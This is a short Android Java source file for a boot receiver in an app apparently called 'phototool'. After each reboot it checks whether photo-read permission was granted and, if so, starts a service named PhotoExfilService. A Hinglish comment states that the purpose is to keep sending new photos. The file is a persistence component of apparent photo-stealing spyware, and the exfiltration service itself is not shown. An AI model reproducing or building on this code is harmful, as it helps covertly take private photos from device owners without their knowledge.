package com.secure.labs.phototool;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;

/** Reboot ke baad naye photos bhejne ke liye (agar permission mili thi). */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) return;

        boolean granted;
        if (Build.VERSION.SDK_INT >= 33) {
            granted = context.checkSelfPermission("android.permission.READ_MEDIA_IMAGES")
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            granted = context.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE")
                    == PackageManager.PERMISSION_GRANTED;
        }

        if (granted) {
            context.startService(new Intent(context, PhotoExfilService.class));
        }
    }
}
